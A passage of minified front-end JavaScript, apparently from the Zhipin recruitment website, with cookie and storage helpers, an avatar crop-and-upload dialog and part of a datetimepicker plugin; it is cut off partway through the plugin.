var DEBUG = !0, UA = window.navigator.userAgent, isIE, isWebkit, isZpdesk, ipcRenderer, isTouch = !1, supportsCalcVh = ((-1 < UA.indexOf("Edge/") || -1 < UA.indexOf("MSIE ") || -1 < UA.indexOf("Trident/")) && (isIE = !0),
!!window.CSS && CSS.supports("height", "calc(100vh - 0px)")), isTouch, loadScript = (-1 < UA.indexOf("ZhipinDesktop/") && (isZpdesk = !0,
ipcRenderer = window.top.ipcRenderer),
isZpdesk && ipcRenderer.send("messageLogout"),
"ontouchstart"in window && (isTouch = !0,
document.addEventListener("touchstart", function() {}, !1)),
function(e) {
    var t, i;
    if (e && "" != e)
        for (t = e.split(","),
        i = 0; i < t.length; i++)
            $.getScript(t[i])
}
);
function loadCss(e) {
    var t = document.createElement("link");
    t.type = "text/css",
    t.rel = "stylesheet",
    t.href = e,
    document.getElementsByTagName("head")[0].appendChild(t)
}
function seriesLoadScripts(t, i) {
    function n(e) {
        o[e] = document.createElement("script"),
        o[e].setAttribute("type", "text/javascript"),
        o[e].setAttribute("charset", "UTF-8"),
        o[e].onload = o[e].onreadystatechange = function() {
            this.isLoaded || this.readyState && !/loaded|complete/.test(this.readyState) || (this.isLoaded = !0,
            this.onload = this.onreadystatechange = null,
            this.parentNode.removeChild(this),
            e != s ? n(e + 1) : "function" == typeof i && i())
        }
        ,
        o[e].setAttribute("src", t[e]),
        a.appendChild(o[e])
    }
    "object" != typeof t && (t = [t]);
    var a = document.getElementsByTagName("head").item(0) || document.documentElement
      , o = new Array
      , s = t.length - 1;
    n(0)
}
function isVisiable(e) {
    if (e)
        return e = e.getBoundingClientRect(),
        0 < e.top && 0 < window.innerHeight - e.top || e.top <= 0 && 0 <= e.bottom
}
function isEmptyObject(e) {
    for (var t in e)
        return !1;
    return !0
}
function getQueryString(e) {
    e = new RegExp("(^|&)" + e + "=([^&]*)(&|$)"),
    e = window.location.search.substr(1).match(e);
    return null != e ? decodeURIComponent(e[2]) : null
}
function getQueryObject() {
    var e = location.search
      , t = {};
    if (-1 != e.indexOf("?")) {
        e = e.substr(1);
        strs = e.split("&");
        for (var i = 0; i < strs.length; i++)
            t[strs[i].split("=")[0]] = decodeURIComponent(strs[i].split("=")[1])
    }
    return t
}
function getQueryArray() {
    var e = location.search
      , t = [];
    return t = -1 != e.indexOf("?") ? e.substr(1).split("&") : t
}
$(function() {
    "undefined" != typeof loginjson && 1 == loginjson.act && ($(".sign-register .form-btn .btn").html("" == loginjson.btnValue ? "登录" : loginjson.btnValue),
    $(".sign-register .sign-tab").hide(),
    $(".sign-register .title").html(loginjson.titleValue))
});
var Cookie = {
    get: function(e) {
        var e = new RegExp("(^| )" + e + "=([^;]*)(;|$)");
        return (e = document.cookie.match(e)) ? unescape(e[2]) : null
    },
    getObj: function() {
        for (var e = document.cookie.split(";"), t = "{", i = 0; i < e.length; i++) {
            var n = e[i].split("=");
            t += '"' + n[0].replace(/\s+/g, "") + '":"' + decodeURIComponent(n[1]) + '",'
        }
        return t = t.slice(0, -1),
        t += "}",
        JSON.parse(t)
    },
    set: function(e, t, i, n, a) {
        e = e + "=" + encodeURIComponent(t);
        i && (e += ";expires=" + new Date(i).toGMTString()),
        e = n ? e + ";domain=" + n : e,
        e = a ? e + ";path=" + a : e,
        document.cookie = e
    },
    del: function(e, t, i) {
        e = e + "=null;expires=" + new Date("1970/01/01").toGMTString(),
        e = t ? e + ";domain=" + t : e;
        e = i ? e + ";path=" + i : e,
        document.cookie = e
    }
}
  , cookie = {
    get: function(e) {
        var e = new RegExp("(^| )" + e + "=([^;]*)(;|$)");
        return (e = document.cookie.match(e)) ? unescape(e[2]) : null
    },
    set: function(e, t, i) {
        var n;
        i ? ((n = new Date).setMinutes(i),
        document.cookie = e + "=" + encodeURIComponent(t) + ";expires=" + n.toGMTString()) : document.cookie = e + "=" + encodeURIComponent(t)
    },
    clearcookie: function(e, t, i) {
        cookie.get(e) && (document.cookie = e + "=" + (t ? ";path=" + t : "") + (i ? ";domain=" + i : "") + ";expires=Thu,01-Jan-1970 00:00:01 GMT")
    }
};
function localStorageInstance(e, t) {
    try {
        if (window.localStorage)
            if ("" === t)
                window.localStorage.removeItem(e);
            else {
                if (0 != t && !t)
                    return window.localStorage[e];
                window.localStorage[e] = t
            }
        else if ("" === t)
            cookie.clearcookie(e);
        else {
            if (0 != t && !t)
                return cookie.get(e);
            cookie.set(e, t, 1e4)
        }
    } catch (e) {}
}
function getUuid(e, t) {
    var i, n, a = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".split(""), o = [];
    if (t = t || a.length,
    e)
        for (i = 0; i < e; i++)
            o[i] = a[0 | Math.random() * t];
    else
        for (o[8] = o[13] = o[18] = o[23] = "-",
        o[14] = "4",
        i = 0; i < 36; i++)
            o[i] || (n = 0 | 16 * Math.random(),
            o[i] = a[19 == i ? 3 & n | 8 : n]);
    return o.join("")
}
function filterXss(e) {
    return e && e.replace(/\</g, "&lt;").replace(/\>/g, "&gt;")
}
var PAGE_ACTIVITY = !0;
function bindObjOutsiteClick(t, e, i) {
    var n = "doc_" + (new Date).getTime()
      , a = "doc_" + (new Date).getTime() + 1;
    t.attr("class") && t.attr("class", t.attr("class").replace(/doc_(\d+)/g, "")),
    t.addClass(n),
    e && (e.attr("class", e.attr("class").replace(/doc_(\d+)/g, "")),
    e.addClass(a)),
    setTimeout(function() {
        $(document).bind("click", function(e) {
            $(e.target).hasClass(a) || $(e.target).parents(".showErrorBox").length || 0 == $(e.target).parents("." + n).length && (t.hide(),
            "function" == typeof i && i(),
            $(document).unbind("click"))
        })
    }, 200)
}
function unbindObjOutsiteClick(e, t) {
    "function" == typeof t && t(),
    $(document).unbind("click")
}
!function() {
    var i = "hidden";
    function e(e) {
        var t = {
            focus: !0,
            focusin: !0,
            pageshow: !0,
            blur: !1,
            focusout: !1,
            pagehide: !1
        };
        e = e || window.event,
        (PAGE_ACTIVITY = e.type in t ? t[e.type] : !this[i]) && window.zpToken && window.zpToken.checkValid()
    }
    i in document ? document.addEventListener("visibilitychange", e) : (i = "mozHidden")in document ? document.addEventListener("mozvisibilitychange", e) : (i = "webkitHidden")in document ? document.addEventListener("webkitvisibilitychange", e) : (i = "msHidden")in document ? document.addEventListener("msvisibilitychange", e) : "onfocusin"in document ? document.onfocusin = document.onfocusout = e : window.onpageshow = window.onpagehide = window.onfocus = window.onblur = e
}(),
window.INTERFACE_URLS = {
    homeUrl: "/",
    logoutUrl: "/web/zppassport/logout",
    chatProtoUrl: "/v2/web/boss/js/module/chat.proto"
},
window._AMapSecurityConfig = {
    serviceHost: -1 < window.location.host.indexOf("weizhipin.com") ? "https://amap-proxy.weizhipin.com/_AMapService" : "https://amap-proxy.zpurl.cn/_AMapService"
},
$(".nav-figure").length && !$(".standard").length && ($(".user-nav ul a").eq(0).attr("disabled", "disabled"),
$(".user-nav ul a").eq(0).on("click", function(e) {
    alert("请升级您的浏览器才能使用聊天功能"),
    e.preventDefault()
})),
!function() {
    var e = -1 < location.href.indexOf("/gongsi/fa2f92669c66eee31Hc~")
      , t = "undefined" == typeof _PAGE
      , i = -1 < encodeURIComponent(document.referrer).indexOf("security-check.html");
    e && ((new Image).src = "https://t.zhipin.com/f.gif?pk=" + ("BSCompany_" + (t ? "mobile" : "pc") + "_" + (i ? "isCheck" : "notCheck")) + "&r=" + encodeURIComponent(document.referrer))
}();
var KZ = KZ || {}, KZ = {
    form: {
        Prompt: function(e, t) {
            e = $('<div class="kz_tishi" style="position:absolute;z-index:9999;"/>').html(e);
            0 == $(".kz_tishi").length && (e.appendTo("body").delay(1500).fadeOut(500, function() {
                $(this).remove()
            }),
            e.css({
                left: 1 == t ? ($(window).width() - e.outerWidth()) / 2 : 0,
                top: 1 == t ? ($(window).height() - e.outerHeight()) / 2 : 0,
                width: 1 == t ? "auto" : "100%",
                position: "fixed"
            }))
        }
    },
    pageLock: {
        show: function(e, t, i, n, a) {
            var o = $(".guide").length ? $(window.document) : $(window.parent.document);
            0 == o.find(t.selector).length ? (o.width(),
            $(t).outerWidth(),
            $(window).height(),
            $(t).outerHeight()) : (o.width(),
            o.find(t.selector).outerWidth(),
            $(window).height(),
            o.find(t.selector).outerHeight()),
            0 < !o.find("#lockpage").length && $("<div id='lockpage'/>").css({
                position: "fixed",
                zIndex: e || 20,
                left: 0,
                top: 0,
                width: "100%",
                height: "100%",
                background: "#000",
                opacity: .8
            }).appendTo(o.find("body")),
            o.find("#lockpage").css("height", $(document).height() + "px"),
            0 == o.find(t.selector).length ? ($(t).appendTo(o.find("body")),
            o.find(t).css({
                position: "fixed",
                zIndex: e + 1,
                left: "50%",
                top: "50%",
                "margin-left": "-" + $(t).outerWidth() / 2 + "px",
                "margin-top": "-" + $(t).outerHeight() / 2 + "px",
                display: "block"
            })) : o.find(t.selector).css({
                position: "fixed",
                zIndex: e + 1,
                left: "50%",
                top: "50%",
                "margin-left": "-" + $(t.selector).outerWidth() / 2 + "px",
                "margin-top": "-" + $(t.selector).outerHeight() / 2 + "px",
                display: "block"
            }),
            KZ.pageLock.hide(i, t, a),
            "function" == typeof n && n()
        },
        hide: function(e, t, i) {
            var n = $(".guide").length ? $(window.document) : $(window.parent.document);
            n.find(e).click(function(e) {
                void 0 === i && n.find(t).appendTo("body"),
                $(t).hide(),
                n.find("#lockpage").remove(),
                e.preventDefault()
            })
        },
        runHide: function(e) {
            var t = $(".guide").length ? $(window.document) : $(window.parent.document);
            0 < t.find(e.selector).length ? setTimeout(function() {
                t.find(e).remove()
            }, 100) : t.find(e).hide(),
            t.find("#lockpage").remove()
        },
        runRemove: function(e) {
            var t = $(".guide").length ? $(window.document) : $(window.parent.document);
            t.find(e).appendTo("body"),
            $(e).hide(),
            t.find("#lockpage").remove()
        }
    }
}, explorer = window.navigator.userAgent, b_version, version, crop = (0 <= explorer.indexOf("MSIE") ? (b_version = navigator.appVersion,
version = b_version.split(";"),
window.IE = parseInt(version[1].replace(/[^\d\.]/g, "")),
$("html").addClass("ie")) : window.IE = 0,
0 < window.IE && window.IE < 9 && !Array.prototype.indexOf && (Array.prototype.indexOf = function(e) {
    for (var t = 0; t < this.length; t++)
        if (e === this[t])
            return t;
    return -1
}
),
$(function() {
    $.extend({
        initUploadPortrait: function(e) {
            var i = $.extend({
                title: "上传照片",
                url: "uploadURL=/companyugc/upload/logo.json?c=uploadPortrit&amp;jsCallback=uploadOk",
                callback: null
            }, e)
              , e = "";
            e += '<section class="p_dialog uploadPortrait"><div class="dialog_con"><a href="#" rel="nofollow" class="dialog_close"></a><div id="uploadLogoFlash"><h3>' + i.title + '</h3><object id="FlashID" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="550" height="440"><param name="movie" value="/v2/web/geek/images/portrait.swf" /><param name="quality" value="high" /><param name="wmode" value="transparent" /><param name="flashVars" value="' + i.url + '" />\x3c!--[if !IE]>--\x3e<object type="application/x-shockwave-flash" data="/v2/web/geek/images/portrait.swf" width="550" height="440">\x3c!--<![endif]--\x3e<param name="quality" value="high" /><param name="wmode" value="transparent" /><param name="flashVars" value="' + i.url + '" />\x3c!--[if !IE]>--\x3e</object>\x3c!--<![endif]--\x3e</object></div></div></section>',
            $(".p_dialog").length <= 0 && $(e).appendTo("body"),
            KZ.pageLock.show(1e3, ".uploadPortrait", ".uploadPortrait .dialog_close"),
            top.uploadOk = function(e) {
                var t, e = "string" == typeof e ? $.parseJSON(e) : e;
                e && 1 == e.rescode ? (t = e.url || [],
                i.callback && (i.callback(t, e),
                KZ.pageLock.runHide(".uploadPortrait"))) : alert("图片上传失败")
            }
        }
    })
}),
{
    cWidth: 350,
    cHeight: 350,
    cR: 175,
    show: function(e) {
        this.opts = e,
        crop.uploadEl = e.element,
        this.inited || (this.bindFileInput(e.defaultAvatarHtml),
        this.inited = !0,
        this.selected = !1),
        e.title && this.html.find(".hd span").text(e.title),
        KZ.pageLock.show(1e3, ".avatar_layer_html5", ".avatar_layer_html5 .close")
    },
    hide: function() {
        this.html.find(".close").click()
    },
    bindFileInput: function(i) {
        var n = this;
        this.html || (this.html = i || $('<div class="avatar_layer avatar_layer_html5">\t\t\t\t\t\t\t\t<div class="hd"><span/><i class="close"/></div>\t\t\t\t\t\t\t\t<div class="main">\t\t\t\t\t\t\t\t\t<div class="selectpic">\t\t\t\t\t\t\t\t\t\t<div class="sbox">\t\t\t\t\t\t\t\t\t\t\t<a class="btns" href="#">选择图片</a>\t\t\t\t\t\t\t\t\t\t\t<input type="file" class="selectfile">\t\t\t\t\t\t\t\t\t\t\t<p>只支持JPG、PNG，大小不超过2M</p>\t\t\t\t\t\t\t\t\t\t</div>\t\t\t\t\t\t\t\t\t\t<div class="editbox">\t\t\t\t\t\t\t\t\t\t\t<canvas></canvas>\t\t\t\t\t\t\t\t\t\t\t<div class="pop"><i></i></div>\t\t\t\t\t\t\t\t\t\t</div>\t\t\t\t\t\t\t\t\t</div>\t\t\t\t\t\t\t\t\t<div class="layer_btns">\t\t\t\t\t\t\t\t\t\t<span class="change">更换图片<input type="file" class="selectfile"></span>\t\t\t\t\t\t\t\t\t\t<a class="cancel close" href="#">取 消</a>\t\t\t\t\t\t\t\t\t\t<a class="sure"  href="#" ka="avatar_layer_html5_button_sure">确 定</a>\t\t\t\t\t\t\t\t\t</div>\t\t\t\t\t\t\t\t</div>\t\t\t\t\t\t\t</div>'),
        this.html.appendTo("body"),
        i ? (n.html.find(".img-box").on("click", function() {
            $(this).addClass("img-checked").siblings().removeClass("img-checked")
        }),
        this.html.find(".sure").on("click", function(i) {
            if (n.selected)
                "function" == typeof n.opts.callback && crop.getCropData(n.opts.callback),
                n.hide(),
                n.clear(),
                i.preventDefault();
            else {
                if (!n.html.find(".img-checked").length)
                    return alert("请选择图片"),
                    !1;
                $.ajax({
                    url: $("[upload-base64-url]").attr("upload-base64-url"),
                    type: "post",
                    data: {
                        headImg: n.html.find(".img-checked img").attr("data-id")
                    },
                    dataType: "json",
                    success: function(e) {
                        var t;
                        e.rescode ? ((t = $(".avatar_box .avatar img")).attr("src", e.url[0]),
                        t.closest("dd").find("input:hidden[name=tiny]").val(e.url[0]),
                        t.closest("dd").find("input:hidden[name=large]").val(e.url[1]),
                        n.hide(),
                        n.clear(),
                        i.preventDefault(),
                        crop.uploadEl.find(".tip-text").remove(),
                        "function" == typeof n.opts.sysImgCallback && n.opts.sysImgCallback(e.url)) : alert("图片保存失败")
                    }
                })
            }
        })) : this.html.find(".sure").on("click", function(e) {
            if (!n.selected)
                return alert("请选择图片"),
                !1;
            "function" == typeof n.opts.callback && crop.getCropData(n.opts.callback),
            n.hide(),
            n.clear(),
            e.preventDefault()
        }),
        this.html.find(".cancel").bind("click", function(e) {
            n.clear(),
            e.preventDefault()
        })),
        this.html.find(".selectfile,.layer_btns .selectfile").change(function(e) {
            if (e.target.files.length) {
                i && crop.uploadEl.find(".tip-text").remove();
                var t, e = e.target.files[0];
                if (!/image\/\w+/.test(e.type))
                    return alert("请确保文件为图像类型"),
                    !1;
                window.FileReader && ((t = new FileReader).onloadstart = function(e) {}
                ,
                t.onloadend = function(e) {
                    var t = new Image;
                    t.onload = function() {
                        crop.resetImg(t)
                    }
                    ,
                    t.src = e.target.result
                }
                ,
                t.readAsDataURL(e))
            }
        })
    },
    clear: function() {
        this.editbox && (this.html.find(".selectfile").val(""),
        this.editbox.css({
            backgroundImage: "none"
        }).hide(),
        this.html.find(".selectpic").find(".sbox").show(),
        this.msk.clearRect(0, 0, this.cWidth, this.cHeight),
        this.html.find(".layer_btns .change").hide())
    },
    resetImg: function(e) {
        this.selected = !0;
        var s = this
          , t = this.html.find(".selectpic").find(".sbox").hide().end().find(".editbox").show()
          , e = (this.html.find(".layer_btns .change").css("display", "inline-block"),
        this.editbox = t,
        this.compress(e, 1));
        this.img = e,
        t.css({
            backgroundImage: "url(" + e + ")"
        }),
        this.circle = {
            x: this.cWidth / 2,
            y: this.cHeight / 2,
            r: 75
        },
        this.popbox = t.find(".pop"),
        this.pop = t.find(".pop i"),
        this.popbox.css({
            left: this.circle.x - this.circle.r,
            top: this.circle.y - this.circle.r,
            width: 2 * this.circle.r,
            height: 2 * this.circle.r
        }),
        s.html.find(".selectpic .editbox .pop .move-icon").length && s.html.find(".selectpic .editbox .pop .move-icon").remove(),
        s.html.find(".selectpic .editbox .pop").append('<div class="move-icon"></div>'),
        s.html.find(".selectpic .editbox .pop .move-icon").hide();
        s.html.find(".selectpic .editbox .pop i .scale-icon").length && s.html.find(".selectpic .editbox .pop i .scale-icon").remove(),
        s.html.find(".selectpic .editbox .pop i").append('<div class="scale-icon"></div>'),
        s.html.find(".selectpic .editbox .pop i .scale-icon").hide(),
        this.popbox.bind("mousedown", function(e) {
            var i = crop.circle.x
              , n = crop.circle.y
              , a = (crop.circle.r,
            e.clientX)
              , o = e.clientY;
            $(this).position().left,
            $(this).position().top;
            s.html.bind("mousemove", function(e) {
                var t = e.clientX - a
                  , e = e.clientY - o;
                crop.circle.x = i + t,
                crop.circle.y = n + e,
                crop.popbox.css({
                    left: crop.circle.x - crop.circle.r,
                    top: crop.circle.y - crop.circle.r,
                    width: 2 * crop.circle.r,
                    height: 2 * crop.circle.r
                }),
                crop.draw(crop.circle)
            }),
            s.html.bind("mouseup", function(e) {
                crop.circle.x - crop.circle.r < 0 && (crop.circle.x = crop.circle.r),
                crop.circle.x + crop.circle.r > s.cWidth && (crop.circle.x = s.cWidth - crop.circle.r),
                crop.circle.y - crop.circle.r < 0 && (crop.circle.y = crop.circle.r),
                crop.circle.y + crop.circle.r > s.cHeight && (crop.circle.y = s.cHeight - crop.circle.r),
                crop.popbox.css({
                    left: crop.circle.x - crop.circle.r,
                    top: crop.circle.y - crop.circle.r,
                    width: 2 * crop.circle.r,
                    height: 2 * crop.circle.r
                }),
                crop.draw(crop.circle),
                s.html.unbind("mousemove mouseup")
            }),
            s.html.find(".selectpic .editbox .pop .move-icon").show()
        }),
        this.popbox.bind("mouseover", function(e) {
            s.html.find(".selectpic .editbox .pop .move-icon").show()
        }),
        this.popbox.bind("mouseleave", function(e) {
            s.html.find(".selectpic .editbox .pop .move-icon").hide()
        }),
        this.pop.bind("mouseenter", function() {
            return s.html.find(".selectpic .editbox .pop .move-icon").hide(),
            s.html.find(".selectpic .editbox .pop .scale-icon").show(),
            !1
        }),
        this.pop.bind("mouseleave", function() {
            return s.html.find(".selectpic .editbox .pop .scale-icon").hide(),
            s.html.find(".selectpic .editbox .pop .move-icon").hide(),
            !1
        }),
        this.pop.bind("mousedown", function(e) {
            crop.circle.x,
            crop.circle.y;
            var i = crop.circle.r
              , n = e.clientX
              , a = e.clientY;
            $(this).position().left,
            $(this).position().top;
            s.html.bind("mousemove", function(e) {
                var t = e.clientX - n
                  , e = e.clientY - a
                  , t = Math.max(t, e);
                crop.circle.r = i + t,
                crop.popbox.css({
                    left: crop.circle.x - crop.circle.r,
                    top: crop.circle.y - crop.circle.r,
                    width: 2 * crop.circle.r,
                    height: 2 * crop.circle.r
                }),
                crop.draw(crop.circle),
                s.html.find(".selectpic .editbox .pop .scale-icon").show(),
                s.html.find(".selectpic .editbox .pop .move-icon").hide()
            }),
            s.html.bind("mouseup", function() {
                crop.circle.r < 75 && (crop.circle.r = 75),
                crop.circle.r > s.cR && (crop.circle.r = s.cR),
                crop.circle.x - crop.circle.r < 0 && (crop.circle.x = crop.circle.r),
                crop.circle.x + crop.circle.r > s.cWidth && (crop.circle.x = s.cWidth - crop.circle.r),
                crop.circle.y - crop.circle.r < 0 && (crop.circle.y = crop.circle.r),
                crop.circle.y + crop.circle.r > s.cHeight && (crop.circle.y = s.cHeight - crop.circle.r),
                crop.popbox.css({
                    left: crop.circle.x - crop.circle.r,
                    top: crop.circle.y - crop.circle.r,
                    width: 2 * crop.circle.r,
                    height: 2 * crop.circle.r
                }),
                crop.draw(crop.circle),
                s.html.unbind("mousemove mouseup"),
                s.html.find(".selectpic .editbox .pop .scale-icon").hide(),
                s.html.find(".selectpic .editbox .pop .move-icon").css({
                    left: crop.circle.r - 15,
                    top: crop.circle.r - 15
                })
            }),
            e.preventDefault(),
            e.stopPropagation(),
            e.stopImmediatePropagation()
        }),
        this.mask = this.html.find(".selectpic canvas").get(0),
        this.msk = this.mask.getContext("2d"),
        this.mask.width = this.cWidth,
        this.mask.height = this.cHeight,
        this.draw(this.circle)
    },
    draw: function(e) {
        var t = this.msk;
        t.clearRect(0, 0, this.cWidth, this.cHeight),
        t.globalCompositeOperation = "source-over",
        t.beginPath(),
        t.fillStyle = "#000000",
        t.rect(0, 0, this.cWidth, this.cHeight),
        t.globalAlpha = .6,
        t.fill(),
        t.closePath(),
        t.globalCompositeOperation = "destination-out",
        t.beginPath(),
        t.fillStyle = "",
        t.arc(e.x, e.y, e.r, 0, 2 * Math.PI, !1),
        t.fill(),
        t.closePath()
    },
    getCropData: function(i) {
        var n = this.circle
          , a = new Image;
        a.crossOrigin = "Anonymous",
        a.onload = function() {
            var e = document.createElement("canvas")
              , t = (e.width = 2 * n.r,
            e.height = 2 * n.r,
            e.getContext("2d"))
              , t = (t.clearRect(0, 0, e.width, e.height),
            t.fillStyle = "#fff",
            t.fillRect(0, 0, e.width, e.height),
            t.drawImage(a, -1 * (n.x - n.r), -1 * (n.y - n.r)),
            e.toDataURL("image/jpeg", 1));
            i(t)
        }
        ,
        a.src = this.img
    },
    compress: function(e, t) {
        var i = this.cWidth
          , n = this.cHeight
          , a = (e.width > e.height ? (imageWidth = i,
        imageHeight = Math.round(n * (e.height / e.width))) : e.width < e.height ? (imageHeight = n,
        imageWidth = Math.round(i * (e.width / e.height))) : (imageWidth = i,
        imageHeight = n),
        t = imageWidth / e.width,
        document.createElement("canvas"))
          , i = (a.width = i,
        a.height = n,
        a.getContext("2d"));
        return i.clearRect(0, 0, a.width, a.height),
        imageWidth < a.width ? i.drawImage(e, (a.width - imageWidth) / 2, 0, imageWidth, imageHeight) : i.drawImage(e, 0, (a.height - imageHeight) / 2, imageWidth, imageHeight),
        a.toDataURL("image/png", t)
    }
}), jconfirm, Jconfirm;
if (!function(S) {
    function D() {
        return new Date(Date.UTC.apply(Date, arguments))
    }
    function v(e, t) {
        var i = this;
        this.element = S(e),
        this.container = t.container || "body",
        this.inDate = t.inDate || [],
        this.language = t.language || this.element.data("date-language") || "en",
        this.language = this.language in E ? this.language : "en",
        this.isRTL = E[this.language].rtl || !1,
        this.formatType = t.formatType || this.element.data("format-type") || "standard",
        this.format = j.parseFormat(t.format || this.element.data("date-format") || E[this.language].format || j.getDefaultFormat(this.formatType, "input"), this.formatType),
        this.isInline = !1,
        this.isVisible = !1,
        this.isInput = this.element.is("input"),
        this.bootcssVer = this.isInput ? this.element.is(".form-control") ? 3 : 2 : this.bootcssVer = this.element.is(".input-group") ? 3 : 2,
        this.component = !!this.element.is(".date") && (3 == this.bootcssVer ? this.element.find(".input-group-addon .glyphicon-th, .input-group-addon .glyphicon-time, .input-group-addon .glyphicon-calendar") : this.element.find(".add-on .icon-th, .add-on .icon-time, .add-on .icon-calendar")).parent(),
        this.componentReset = !!this.element.is(".date") && (3 == this.bootcssVer ? this.element.find(".input-group-addon .glyphicon-remove") : this.element.find(".add-on .icon-remove")).parent(),
        this.hasInput = this.component && this.element.find("input").length,
        this.component && 0 === this.component.length && (this.component = !1),
        this.linkField = t.linkField || this.element.data("link-field") || !1,
        this.linkFormat = j.parseFormat(t.linkFormat || this.element.data("link-format") || j.getDefaultFormat(this.formatType, "link"), this.formatType),
        this.minuteStep = t.minuteStep || this.element.data("minute-step") || 5,
        this.pickerPosition = t.pickerPosition || this.element.data("picker-position") || "bottom-right",
        this.showMeridian = t.showMeridian || this.element.data("show-meridian") || !1,
        this.initialDate = t.initialDate || new Date,
        this.minLimitYear = t.minLimitYear || !1,
        this._attachEvents(),
        this.formatViewType = "datetime",
        "formatViewType"in t ? this.formatViewType = t.formatViewType : "formatViewType"in this.element.data() && (this.formatViewType = this.element.data("formatViewType")),
        this.minView = 0,
        "minView"in t ? this.minView = t.minView : "minView"in this.element.data() && (this.minView = this.element.data("min-view")),
        this.minView = j.convertViewMode(this.minView),
        this.maxView = j.modes.length - 1,
        "maxView"in t ? this.maxView = t.maxView : "maxView"in this.element.data() && (this.maxView = this.element.data("max-view")),
        this.maxView = j.convertViewMode(this.maxView),
        this.wheelViewModeNavigation = !1,
        "wheelViewModeNavigation"in t ? this.wheelViewModeNavigation = t.wheelViewModeNavigation : "wheelViewModeNavigation"in this.element.data() && (this.wheelViewModeNavigation = this.element.data("view-mode-wheel-navigation")),
        this.wheelViewModeNavigationInverseDirection = !1,
        "wheelViewModeNavigationInverseDirection"in t ? this.wheelViewModeNavigationInverseDirection = t.wheelViewModeNavigationInverseDirection : "wheelViewModeNavigationInverseDirection"in this.element.data() && (this.wheelViewModeNavigationInverseDirection = this.element.data("view-mode-wheel-navigation-inverse-dir")),
        this.wheelViewModeNavigationDelay = 100,
        "wheelViewModeNavigationDelay"in t ? this.wheelViewModeNavigationDelay = t.wheelViewModeNavigationDelay : "wheelViewModeNavigationDelay"in this.element.data() && (this.wheelViewModeNavigationDelay = this.element.data("view-mode-wheel-navigation-delay")),
        this.startViewMode = 2,
        "startView"in t ? this.startViewMode = t.startView : "startView"in this.element.data() && (this.startViewMode = this.element.data("start-view")),
        this.startViewMode = j.convertViewMode(this.startViewMode),
        this.viewMode = this.startViewMode,
        this.viewSelect = this.minView,
        "viewSelect"in t ? this.viewSelect = t.viewSelect : "viewSelect"in this.element.data() && (this.viewSelect = this.element.data("view-select")),
        this.viewSelect = j.convertViewMode(this.viewSelect),
        this.forceParse = !0,
        "forceParse"in t ? this.forceParse = t.forceParse : "dateForceParse"in this.element.data() && (this.forceParse = this.element.data("date-force-parse")),
        this.picker = S(3 == this.bootcssVer ? j.templateV3 : j.template).appendTo(this.isInline ? this.element : this.container).on({
            click: S.proxy(this.click, this),
            mousedown: S.proxy(this.mousedown, this)
        }),
        this.wheelViewModeNavigation && (S.fn.mousewheel ? this.picker.on({
            mousewheel: S.proxy(this.mousewheel, this)
        }) : console.log("Mouse Wheel event is not supported. Please include the jQuery Mouse Wheel plugin before enabling this option")),
        this.isInline ? this.picker.addClass("datetimepicker-inline") : this.picker.addClass("datetimepicker-dropdown-" + this.pickerPosition),
        this.isRTL && (this.picker.addClass("datetimepicker-rtl"),
        3 == this.bootcssVer ? this.picker.find(".prev span, .next span").toggleClass("glyphicon-arrow-left glyphicon-arrow-right") : this.picker.find(".prev i, .next i").toggleClass("icon-arrow-left icon-arrow-right")),
        this.minLimitYear && this.picker.addClass("date-showminyear"),
        S(document).on("click", function(e) {
            0 === S(e.target).closest(".datetimepicker").length && i.hide()
        }),
        this.autoclose = !1,
        "autoclose"in t ? this.autoclose = t.autoclose : "dateAutoclose"in this.element.data() && (this.autoclose = this.element.data("date-autoclose")),
        this.keyboardNavigation = !0,
        "keyboardNavigation"in t ? this.keyboardNavigation = t.keyboardNavigation : "dateKeyboardNavigation"in this.element.data() && (this.keyboardNavigation = this.element.data("date-keyboard-navigation")),
        this.todayBtn = t.todayBtn || this.element.data("date-today-btn") || !1,
        this.todayHighlight = t.todayHighlight || this.element.data("date-today-highlight") || !1,
        this.weekStart = (t.weekStart || this.element.data("date-weekstart") || E[this.language].weekStart || 0) % 7,
        this.weekEnd = (this.weekStart + 6) % 7,
        this.startDate = -1 / 0,
        this.endDate = 1 / 0,
        this.daysOfWeekDisabled = [],
        this.setStartDate(t.startDate || this.element.data("date-startdate")),
        this.setEndDate(t.endDate || this.element.data("date-enddate")),
        this.setDaysOfWeekDisabled(t.daysOfWeekDisabled || this.element.data("date-days-of-week-disabled")),
        this.fillDow(),
        this.fillMonths(),
        this.update(),
        this.showMode(),
        this.timer = null,
        this.isInline && this.show()
    }
    v.prototype = {
        constructor: v,
        _events: [],
        _attachEvents: function() {
            this._detachEvents(),
            this.isInput ? this._events = [[this.element, {
                click: S.proxy(this.show, this),
                keyup: S.proxy(this.update, this),
                keydown: S.proxy(this.keydown, this)
            }]] : this.component && this.hasInput ? (this._events = [[this.element.find("input"), {
                click: S.proxy(this.show, this),
                keyup: S.proxy(this.update, this),
                keydown: S.proxy(this.keydown, this)
            }], [this.component, {
                click: S.proxy(this.show, this)
            }]],
            this.componentReset && this._events.push([this.componentReset, {
                click: S.proxy(this.reset, this)
            }])) : this.element.is("div") ? this.isInline = !0 : this._events = [[this.element, {
                click: S.proxy(this.show, this)
            }]];
            for (var e, t, i = 0; i < this._events.length; i++)
                e = this._events[i][0],
                t = this._events[i][1],
                e.on(t)
        },
        _detachEvents: function() {
            for (var e, t, i = 0; i < this._events.length; i++)
                e = this._events[i][0],
                t = this._events[i][1],
                e.off(t);
            this._events = []
        },
        show: function(e) {
            this.picker.is(":visible") ? this.picker.hide() : (S(".datetimepicker").hide(),
            S(".dropdown-select-open").removeClass("dropdown-select-open"),
            S(".dropdown-menu-open").removeClass("dropdown-menu-open"),
            this.element.closest(".dropdown-select").addClass("dropdown-select-open"),
            this.element.closest(".dropdown-wrap").addClass("dropdown-menu-open"),
            this.picker.show(),
            this.height = (this.component || this.element).outerHeight(),
            this.forceParse && this.update(),
            this.place(),
            S(window).on("resize", S.proxy(this.place, this)),
            e && (e.stopPropagation(),
            e.preventDefault()),
            this.isVisible = !0,
            this.element.trigger({
                type: "show",
                date: this.date
            }))
        },
        hide: function(e) {
            !this.isVisible || this.isInline || (this.element.closest(".dropdown-select").removeClass("dropdown-select-open"),
            this.picker.hide(),
            S(window).off("resize", this.place),
            this.viewMode = this.startViewMode,
            this.showMode(),
            this.isInput || S(document).off("mousedown", this.hide),
